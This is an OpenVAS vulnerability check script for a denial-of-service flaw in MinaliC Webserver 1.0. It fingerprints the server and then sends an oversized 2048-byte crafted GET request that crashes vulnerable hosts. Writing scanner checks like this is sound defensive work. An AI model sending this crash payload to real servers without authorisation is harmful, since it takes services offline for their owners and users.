###############################################################################
# OpenVAS Vulnerability Test
#
# MinaliC Webserver Denial of Service Vulnerability
#
# Authors:
# Veerendra GG <veerendragg@secpod.com>
#
# Copyright:
# Copyright (C) 2010 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.800187");
  script_version("2022-05-02T09:35:37+0000");
  script_tag(name:"last_modification", value:"2022-05-02 09:35:37 +0000 (Mon, 02 May 2022)");
  script_tag(name:"creation_date", value:"2010-12-09 06:36:39 +0100 (Thu, 09 Dec 2010)");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_name("MinaliC Webserver Denial of Service Vulnerability");
  script_xref(name:"URL", value:"http://secunia.com/advisories/41982/");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/44393");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/15334/");

  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2010 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_dependencies("gb_get_http_banner.nasl");
  script_require_ports("Services/www", 8080);
  script_mandatory_keys("minaliC/banner");

  script_tag(name:"impact", value:"Successful exploitation will let the remote unauthenticated
  attackers to cause a denial of service or possibly execute arbitrary code.");

  script_tag(name:"affected", value:"MinaliC Webserver MinaliC 1.0");

  script_tag(name:"insight", value:"The flaw is caused the way minalic webserver handles request
  with a length greater than or equal to 2048 bytes.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"MinaliC Webserver is prone to a denial of service (DoS) vulnerability.");
  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");

port = http_get_port(default:8080);

banner = http_get_remote_headers(port: port);
if("Server: minaliC" >!< banner){
  exit(0);
}

req = http_get(item:"/", port:port);
res = http_keepalive_send_recv(port:port, data:req);

if("Server: minaliC" >!< res) {
  exit(0);
}

## Send crafted data to server
craftedData = crap(data:"0x00", length:2048);
req = http_get(item:craftedData, port:port);
res = http_keepalive_send_recv(port:port, data:req);

## server is died and it's vulnerable
req = http_get(item:"/", port:port);
res = http_keepalive_send_recv(port:port, data:req);
if("Server: minaliC" >!< res) {
  security_message(port:port);
  exit(0);
}

exit(99);
